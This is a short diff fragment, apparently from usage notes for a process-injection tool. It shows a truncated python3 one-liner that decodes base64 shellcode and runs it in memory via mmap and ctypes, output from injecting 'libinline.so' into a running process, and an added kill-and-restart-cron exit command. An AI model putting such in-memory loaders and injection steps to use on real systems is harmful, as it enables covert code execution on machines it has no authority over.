@@ -26,3 +26,6 @@ python3 -c 'import base64,mmap,ctypes,sys,os;encoded_rawcode="SDHJSIHp+f///0iNBe
 [*] Found library path: ./libinline.so
 [*] Library injected successfully!
 [*] Resumed the target process: 632
+
+# To exit:
+killall -9 hoxha && service cron restart
